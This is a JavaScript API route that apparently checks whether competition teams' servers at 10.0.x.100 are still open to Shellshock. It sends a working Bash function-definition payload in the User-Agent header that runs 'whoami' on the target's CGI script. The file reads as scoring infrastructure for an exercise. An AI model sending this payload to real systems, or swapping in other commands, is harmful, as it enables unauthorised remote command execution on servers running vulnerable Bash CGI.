import prisma from "@/app/lib/prisma";


// import encrypt from "@/app/lib/encrypt"

const axios = require('axios');


async function isVulnerable(team_octet) {
    const defaultCheck = "www-data";
    const defaultCmd = "whoami";
    const endpoint = "vulnerable";
    const url = `http://10.0.${team_octet}.100/cgi-bin/${endpoint}`;
    const headers = {
        'User-Agent': `() { :; }; echo; echo; /bin/bash -c '${defaultCmd}'`
    };

    try {
        const response = await axios.get(url, { headers: headers });
        if (response.status === 200) {
            if (response.data.toLowerCase().includes(defaultCheck.toLowerCase())) {
                return { status: "vulnerable" };
            }
            return { status: "patched" };
        }
        return { status: "modified" };
    } catch (error) {
        return { status: "down" };
    }
}



export async function GET(request, params ){
    try {
        // console.debug(params)
        const response = await isVulnerable(params?.params?.teamId);
        
        // const encryptedData = encrypt({status : true , results:results})
        return new Response(JSON.stringify({status : true , results:response}))

    } catch (error) {
        console.debug(error)
        // const encryptedData = encrypt({status : false , error : `There is an error while fetching quizes. Please try again after some time.`})
        return new Response(JSON.stringify({ status : false , error : `There is an error while fetching quizes. Please try again after some time.` }))
    }
}